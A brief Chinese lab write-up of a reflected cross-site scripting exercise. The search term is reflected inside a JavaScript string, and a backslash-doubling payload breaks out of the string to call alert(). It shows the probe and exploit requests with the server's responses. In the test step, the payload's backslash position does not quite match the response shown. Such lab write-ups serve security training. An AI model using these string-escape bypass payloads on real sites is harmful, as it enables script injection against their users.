# 实验：尖括号和双引号经过 HTML 编码且单引号被转义的 JavaScript 字符串上下文中的反射型 XSS

本实验在搜索查询跟踪（search query tracking）功能中包含一个反射型跨站脚本漏洞，其中尖括号和双引号经过了 HTML 编码，且单引号已被转义。

为了解决本实验，请执行一个跨站脚本攻击，该攻击需要跳出 JavaScript 字符串并调用 `alert` 函数。


## 步骤

探测
- 使用搜索功能
    ```http
    GET /?search=test';alert();// HTTP/2
    ```

    - 响应
        ```html
        <script>
            var searchTerms = 'test\';alert();//';
        ```
        - 使用反斜杠转义
            - 尝试添加反斜杠转义服务器的转义符

测试
- 构造额外转义符的载荷
    ```http
    GET /?search=\test';alert();// HTTP/2
    ```  

    - 响应
        ```html
        <script>
            var searchTerms = 'test\\';
            alert();
            //';
        ```
